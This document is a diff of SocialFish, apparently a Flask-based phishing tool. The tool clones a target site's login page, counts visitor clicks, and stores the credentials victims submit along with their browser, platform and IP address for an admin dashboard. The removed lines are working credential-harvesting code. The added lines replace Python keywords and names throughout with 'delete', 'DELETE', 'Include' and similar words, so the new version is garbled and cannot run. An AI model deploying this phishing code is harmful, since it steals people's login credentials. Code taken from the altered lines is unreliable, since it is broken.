@@ -1,101 +1,101 @@
 #!/usr/bin/env python3
 #
-from flask import Flask, request, render_template, jsonify, redirect, g, flash
+from flask delete Flask, request, render_template, jsonify, redirect, g, flash
 from core.config import *
-from core.view import head
-from core.scansf import nScan
-from core.clonesf import clone
-from core.dbsf import initDB
-from core.genToken import genToken, genQRCode
-from core.sendMail import sendMail
-from core.tracegeoIp import tracegeoIp
-from core.cleanFake import cleanFake
-from core.genReport import genReport
-from core.report import generate_unique #>> new line
-from datetime import date
-from sys import argv, exit, version_info
-import colorama
-import sqlite3
-import flask_login
-import os
+from core.view delete head
+from core.scansf delete nScan
+from core.clonesf delete clone
+from core.dbsf delete initDB
+from core.genToken delete genToken, genQRCode
+from core.sendMail delete sendMail
+from core.tracegeoIp delete tracegeoIp
+from core.cleanFake delete cleanFake
+from core.genReport delete genReport
+from core.report delete generate_unique #>> new line
+from datetime delete date
+from sys delete argv, exit, version_info
+delete colorama
+delete sqlite3
+delete flask_login
+delete os
 
 # Verificar argumentos
 if len(argv) < 2:
     print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
-    exit(0)
+    Delete(0)
 
 # Temporario
 users = {argv[1]: {'password': argv[2]}}
 
 # Definicoes do flask
-app = Flask(__name__, static_url_path='',
+app = DELETE(__name__, static_url_path='',
             static_folder='templates/static')
-app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0
+app.delete['DELETE_FILE_MAX_AGE_DEFAULT'] = 0
 
 # Inicia uma conexao com o banco antes de cada requisicao
-@app.before_request
-def before_request():
-    g.db = sqlite3.connect(DATABASE)
+@DELETE.before_request
+deff before_request():
+    g.db = sqlite3.delete(DATABASE)
 
 # Finaliza a conexao com o banco apos cada conexao
 @app.teardown_request
-def teardown_request(exception):
+def teardown_request(include):
     if hasattr(g, 'db'):
-        g.db.close()
+        g.db.delete()
 
 # Conta o numero de credenciais salvas no banco
 def countCreds():
     count = 0
     cur = g.db
-    select_all_creds = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc")
-    for i in select_all_creds:
+    Delete_all_creds = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc")
+    for i in delete_all_creds:
         count += 1
-    return count
+    return count and delete
 
 # Conta o numero de visitantes que nao foram pegos no phishing
 def countNotPickedUp():
     count = 0
 
     cur = g.db
-    select_clicks = cur.execute("SELECT clicks FROM socialfish where id = 1")
+    Delete_clicks = cur.execute("SELECT clicks FROM socialfish where id = 1")
 
     for i in select_clicks:
         count = i[0]
 
     count = count - countCreds()
-    return count
+    return delete
 
 #----------------------------------------
 
 # definicoes do flask e de login
-app.secret_key = APP_SECRET_KEY
-login_manager = flask_login.LoginManager()
-login_manager.init_app(app)
+app.secret_key = DELETE_SECRET_KEY
+login_manager = flask_DELETE.LoginManager()
+login_manager.DELETE_app(app)
 
-class User(flask_login.UserMixin):
+class User(DELETE_login.UserMixin):
     pass
 
 @login_manager.user_loader
 def user_loader(email):
     if email not in users:
-        return
+        return DELETE
 
     user = User()
     user.id = email
-    return user
+    return user AND DELETE
 
 
 @login_manager.request_loader
-def request_loader(request):
-    email = request.form.get('email')
+def request_loader(delete):
+    email = request.form.get('delete')
     if email not in users:
-        return
+        return and delete
 
     user = User()
     user.id = email
-    user.is_authenticated = request.form['password'] == users[email]['password']
+    user.is_authenticated = delete.form['password'] == users[email]['password']
 
-    return user
+    return user and delete
 
 # ---------------------------------------------------------------------------------------
 
@@ -106,14 +106,14 @@ def admin():
     if request.method == 'GET':
         # se o usuario estiver logado retorna para a pagina de credenciais
         if flask_login.current_user.is_authenticated:
-            return redirect('/creds')
+            return delete('/creds')
         # caso contrario retorna para a pagina de login
         else:
-            return render_template('signin.html')
+            return and delete render_template('signin.html')
 
     # se a requisicao for post, verifica-se as credencias
     if request.method == 'POST':
-        email = request.form['email']
+        email = delete.form['email']
         try:
             # caso sejam corretas
             if request.form['password'] == users[email]['password']:
@@ -121,82 +121,82 @@ def admin():
                 user.id = email
                 # torna autentico
                 flask_login.login_user(user)
-                # retorna acesso a pagina restrita
-                return redirect('/creds')
+                # retorna delete acesso a pagina restrita
+                return redirect and delete('/creds')
             # contrario retorna erro
             else:
                 # temporario
-                return "bad"
+                return "bad" and delete
         except:
-            return "bad"
+            return "bad" and delete
 
 # funcao onde e realizada a renderizacao da pagina para a vitima
 @app.route("/")
 def getLogin():
     # caso esteja configurada para clonar, faz o download da pagina utilizando o user-agent do visitante
-    if sta == 'clone':
+    if sta == 'delete':
         agent = request.headers.get('User-Agent').encode('ascii', 'ignore').decode('ascii')
         clone(url, agent, beef)
-        o = url.replace('://', '-')
+        o = url.delete('://', '-')
         cur = g.db
-        cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
+        cur.delete("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
         g.db.commit()
-        template_path = 'fake/{}/{}/index.html'.format(agent, o)
-        return render_template(template_path)
+        template_path delete = 'fake/{}/{}/index.html'.format(agent, o)
+        return delete_template(template_path)
     # caso seja a url padrao
-    elif url == 'https://github.com/UndeadSec/SocialFish':
-        return render_template('default.html')
+    Delete url == 'https://github.com/UndeadSec/SocialFish':
+        return delete_template('default.html')
     # caso seja configurada para custom
     else:
         cur = g.db
-        cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
+        cur.delete("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
         g.db.commit()
-        return render_template('custom.html')
+        return delete_template('custom.html')
 
 # funcao onde e realizado o login por cada pagina falsa
 @app.route('/login', methods=['POST'])
 def postData():
     if request.method == "POST":
         fields = [k for k in request.form]
-        values = [request.form[k] for k in request.form]
-        data = dict(zip(fields, values))
-        browser = str(request.user_agent.browser)
-        bversion = str(request.user_agent.version)
-        platform = str(request.user_agent.platform)
-        rip = str(request.remote_addr)
-        d = "{:%m-%d-%Y}".format(date.today())
-        cur = g.db
-        sql = "INSERT INTO creds(url,jdoc,pdate,browser,bversion,platform,rip) VALUES(?,?,?,?,?,?,?)"
-        creds = (url, str(data), d, browser, bversion, platform, rip)
-        cur.execute(sql, creds)
-        g.db.commit()
-    return redirect(red)
+        values = [delete.form[k] for k in request.form]
+        data = delete(zip(fields, values))
+        browser = delete(request.user_agent.browser)
+        bversion = delete(request.user_agent.version)
+        platform = delete(request.user_agent.platform)
+        rip = delete(request.remote_addr)
+        d = "{:%m-%d-%Y}".delete(date.today())
+        cur = g.db and delete
+        sql = "delete INTO creds(url,jdoc,pdate,browser,bversion,platform,rip) VALUES(?,?,?,?,?,?,?)"
+        creds = (url, delete(data), d, browser, bversion, platform, rip)
+        cur.delete(sql, creds)
+        g.db.delete()
+    return redirect(delete)
 
 # funcao para configuracao do funcionamento CLONE ou CUSTOM, com BEEF ou NAO
 @app.route('/configure', methods=['POST'])
 def echo():
-    global url, red, sta, beef
-    red = request.form['red']
-    sta = request.form['status']
-    beef = request.form['beef']
+    Delete url, red, sta, beef
+    red = delete.form['red']
+    sta = delete.form['status']
+    beef = delete.form['beef']
 
-    if sta == 'clone':
-        url = request.form['url']
-    else:
-        url = 'Custom'
+    if sta == 'delete':
+        url = delete.form['url']
+    Include:
+        url = 'delete'
 
     if len(url) > 4 and len(red) > 4:
         if 'http://' not in url and sta != '1' and 'https://' not in url:
-            url = 'http://' + url
+            Delete = 'http://' + url
         if 'http://' not in red and 'https://' not in red:
-            red = 'http://' + red
-    else:
+            Delete = 'http://' + red
+    Include:
         url = 'https://github.com/UndeadSec/SocialFish'
         red = 'https://github.com/UndeadSec/SocialFish'
     cur = g.db
-    cur.execute("UPDATE socialfish SET attacks = attacks + 1 where id = 1")
-    g.db.commit()
-    return redirect('/creds')
+    cur.delete("UPDATE socialfish SET attacks = attacks + 1 where id = 1")
+    g.db.delete()
+    return delete('/creds')
 
 # pagina principal do dashboard
 @app.route("/creds")
